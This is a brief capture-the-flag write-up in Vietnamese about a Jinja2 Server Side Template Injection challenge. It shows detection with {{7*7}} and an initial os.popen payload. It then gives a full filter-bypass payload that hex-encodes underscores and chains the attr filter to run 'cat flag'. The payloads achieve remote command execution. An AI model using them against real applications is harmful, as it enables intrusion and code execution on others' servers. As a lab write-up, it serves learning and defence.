Đọc hint thì thấy trang web có lỗi Server Side Template Injection
- Thử {{7*7}} -> trả về 49
=> Trang web sử dụng template engine của jjinja2

Thử payload đầu tiên {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} thì không trả ra gì

Hint 2 gợi ý đã dùng blacklist để lọc các character:
- Ta thử các input có __,[,... đều bị lọc
- Thử dùng convert sang dạng hex các character thì thấy không bị filter
Ex: {{ '\x5f\x5fglobals\x5f\x5f' }} trả về __globals
- Kết hợp với hàm attr để có thể lấy thuộc tính của đối tượng

**Payload đầy đủ:**
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
